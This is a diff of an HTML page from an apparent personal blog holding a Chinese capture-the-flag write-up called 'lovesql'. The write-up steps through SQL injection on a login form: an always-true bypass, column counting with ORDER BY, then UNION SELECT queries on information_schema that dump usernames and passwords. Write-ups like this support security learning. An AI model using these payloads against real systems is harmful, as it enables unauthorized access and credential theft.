@@ -9,8 +9,9 @@
 0’ or 1=1 #
 然后得到个这个
 
+
 虽然不知道是什么东西，但是可以登陆成功说明是有漏洞的。
-第二步、查字段数量然后开始查字段的数量吧，只有知道字段的数量，才能">
+第二步、查字段数量然后开始查字段的数量吧，只有知道字段的数量，才">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -463,12 +464,14 @@
                 <h3 id="第一步、用万能密码测试"><a href="#第一步、用万能密码测试" class="headerlink" title="第一步、用万能密码测试"></a>第一步、用万能密码测试</h3><p>面对sql题，第一步先试试万能密码，反正也没什么事。</p>
 <p><strong>0’ or 1=1 #</strong></p>
 <p>然后得到个这个</p>
-<p><img src="/qiuyu.github.io/qiuyu.github/image-20210920160404745.png" alt="image-20210920160404745"></p>
+<img src="/qiuyu.github.io/qiuyu.github.io/2022/01/16/lovesql/2022/01/16/lovesql/image-20210920160404745.png" title="image-20210920160404745">
+
 <p>虽然不知道是什么东西，但是可以登陆成功说明是有漏洞的。</p>
 <h3 id="第二步、查字段数量"><a href="#第二步、查字段数量" class="headerlink" title="第二步、查字段数量"></a>第二步、查字段数量</h3><p>然后开始查字段的数量吧，只有知道字段的数量，才能用联合查询。</p>
 <p><strong>0’ order by x #</strong> （x为数字，根据回显判断字段数量）</p>
 <p>先试了试0’ order by 2 # 然后没有问题，3也没有问题。到4的时候变成了</p>
-<p><img src="/qiuyu.github.io/qiuyu.github/image-20210920161236927.png" alt="image-20210920161236927"></p>
+<img src="/qiuyu.github.io/qiuyu.github.io/2022/01/16/lovesql/2022/01/16/lovesql/image-20210920161236927.png" title="image-20210920161236927">
+
 <p>说明只有三个字段。</p>
 <h3 id="第三步、爆库名"><a href="#第三步、爆库名" class="headerlink" title="第三步、爆库名"></a>第三步、爆库名</h3><p>用联合查询的时候，select后要跟三个内容，分别对应三个字段。</p>
 <p>格式为：0’ union select 1,1,group_concat(table_schema) from information_schema.tables #</p>
@@ -477,17 +480,25 @@
 <p>但需要注意的是，这样输出会输出很多名称重复的数据，我们可以用在table_schema前面加个distinct来消除重复行。完整语句是：</p>
 <p><strong>0’ union select 1,1,group_concat(distinct table_schema) from information_schema.tables #</strong></p>
 <p>得到下面的结果</p>
-<p><img src="/qiuyu.github.io/qiuyu.github/image-20210920160327350.png" alt="image-20210920160327350"></p>
+<img src="/qiuyu.github.io/qiuyu.github.io/2022/01/16/lovesql/2022/01/16/lovesql/image-20210920160327350.png" title="image-20210920160327350">
+
 <p>应该是在geek库</p>
 <h3 id="第四步、爆表名"><a href="#第四步、爆表名" class="headerlink" title="第四步、爆表名"></a>第四步、爆表名</h3><p><strong>‘ union select 1,1,group_concat(distinct table_name) from information_schema.tables where table_schema=database() #</strong></p>
 <p>得到表名geekuser和l0ve1ysq1</p>
-<p><img src="/qiuyu.github.io/qiuyu.github/image-20210920165434936.png" alt="image-20210920165434936"></p>
+<img src="/qiuyu.github.io/qiuyu.github.io/2022/01/16/lovesql/2022/01/16/lovesql/image-20210920165434936.png" title="image-20210920165434936">
+
+
+
 <h3 id="第五步、爆列名"><a href="#第五步、爆列名" class="headerlink" title="第五步、爆列名"></a>第五步、爆列名</h3><p><strong>0’ union select 1,1,group_concat(distinct column_name) from information_schema.columns where table_name=’l0ve1ysq1’ #</strong></p>
-<p><img src="/qiuyu.github.io/qiuyu.github/image-20210920165601070.png" alt="image-20210920165601070"></p>
+<img src="/qiuyu.github.io/qiuyu.github.io/2022/01/16/lovesql/2022/01/16/lovesql/image-20210920165601070.png" title="image-20210920165601070">
+
+
+
 <h3 id="第六步、爆数据"><a href="#第六步、爆数据" class="headerlink" title="第六步、爆数据"></a>第六步、爆数据</h3><p><strong>0’ union select 1,1,group_concat(id,username,password) from geek.l0ve1ysq1 #</strong></p>
 <p>得到flag</p>
-<p><img src="/qiuyu.github.io/qiuyu.github/image-20210920170821001.png" alt="image-20210920170821001"></p>
-<p><img src="/qiuyu.github.io/qiuyu.github/image-20210920170847727.png" alt="image-20210920170847727"></p>
+<img src="/qiuyu.github.io/qiuyu.github.io/2022/01/16/lovesql/2022/01/16/lovesql/image-20210920170821001.png" title="image-20210920170821001">
+
+<img src="/qiuyu.github.io/qiuyu.github.io/2022/01/16/lovesql/2022/01/16/lovesql/image-20210920170847727.png" title="image-20210920170847727">
 
                 
             </div>
